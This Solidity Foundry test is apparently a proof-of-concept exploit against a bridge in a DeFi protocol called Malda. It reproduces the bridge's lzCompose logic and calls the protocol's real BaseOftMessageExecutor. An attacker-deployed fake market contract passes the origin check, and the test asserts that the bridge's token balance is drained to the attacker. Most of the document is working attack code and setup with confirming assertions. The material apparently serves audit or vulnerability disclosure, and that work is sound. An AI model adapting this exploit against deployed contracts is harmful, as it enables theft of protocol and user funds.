// SPDX-License-Identifier: MIT
pragma solidity =0.8.28;

import "forge-std/Test.sol";
// REAL Malda source (copied verbatim) - the actual vulnerable drain function:
import {BaseOftMessageExecutor} from "src/rebalancer/bridges/helpers/BaseOftMessageExecutor.sol";
import {SendParam} from "src/interfaces/external/layerzero/v2/ILayerZeroOFT.sol";
import {MessagingReceipt, MessagingFee} from "src/interfaces/external/layerzero/v2/ILayerZeroEndpointV2.sol";

// minimal ERC20 (the underlying; native-OFT in the simple branch)
contract MockToken {
    mapping(address => uint256) public balanceOf;
    function totalSupply() external pure returns (uint256) { return 0; }
    function allowance(address, address) external pure returns (uint256) { return 0; }
    function mint(address to, uint256 a) external { balanceOf[to] += a; }
    function transfer(address to, uint256 a) external returns (bool) {
        balanceOf[msg.sender] -= a; balanceOf[to] += a; return true;
    }
    function approve(address, uint256) external pure returns (bool) { return true; }
    function transferFrom(address f, address to, uint256 a) external returns (bool) {
        balanceOf[f] -= a; balanceOf[to] += a; return true;
    }
}

interface IMarketUnderlying { function underlying() external view returns (address); }

// attacker's fake "market": .underlying() returns the REAL underlying U
contract FakeMarket is IMarketUnderlying {
    address public u;
    constructor(address _u) { u = _u; }
    function underlying() external view returns (address) { return u; }
}

// concrete instance of the REAL abstract executor (only executeSend is unimplemented in base)
contract Executor is BaseOftMessageExecutor {
    function executeSend(address, address, SendParam calldata, MessagingFee calldata, address, address)
        external
        payable
        override
        returns (MessagingReceipt memory receipt)
    {
        return receipt; // unused by this PoC (the drain is in executeCompose)
    }
}

// harness reproducing LZUnifiedBridge.lzCompose, delegatecalling the REAL executor
contract BridgeHarness {
    address public immutable ENDPOINT;
    address public immutable executor;
    mapping(address => address) public bridgeContracts;

    constructor(address endpoint, address exec) { ENDPOINT = endpoint; executor = exec; }

    function lzCompose(address from, bytes calldata message) external {
        require(msg.sender == ENDPOINT, "OnlyEndpoint");          // L165
        address market = abi.decode(message, (address));          // L167 attacker-controlled
        address underlying = IMarketUnderlying(market).underlying(); // L168
        address bc = bridgeContracts[underlying];
        if (bc == address(0)) bc = underlying;                    // L171-173
        require(from == bc, "BadFrom");                           // L176
        (bool ok, bytes memory ret) = executor.delegatecall(     // L187 -> REAL _fallbackToUnderlying
            abi.encodeWithSelector(BaseOftMessageExecutor.executeCompose.selector, market, underlying, bc)
        );
        require(ok, string(ret));
    }
}

contract RealExecutorDrainTest is Test {
    MockToken U;
    Executor executor;
    BridgeHarness bridge;
    address ENDPOINT = address(0xE2D);
    address attacker = address(0xA11CE);

    function setUp() public {
        U = new MockToken();
        executor = new Executor();
        bridge = new BridgeHarness(ENDPOINT, address(executor));
        U.mint(address(bridge), 1000 ether); // protocol funds in transit / uncomposed
    }

    function test_real_executor_drains_bridge() public {
        vm.prank(attacker);
        FakeMarket fake = new FakeMarket(address(U));

        assertEq(U.balanceOf(address(bridge)), 1000 ether);
        bytes memory message = abi.encode(address(fake));
        vm.prank(ENDPOINT);
        bridge.lzCompose(address(U), message);

        // DRAIN via the REAL BaseOftMessageExecutor._fallbackToUnderlying:
        assertEq(U.balanceOf(address(bridge)), 0, "BUG: bridge drained (REAL executor source)");
        assertEq(U.balanceOf(address(fake)), 1000 ether, "BUG: attacker received protocol funds");
        emit log_string("CONFIRMED with REAL BaseOftMessageExecutor source");
    }
}
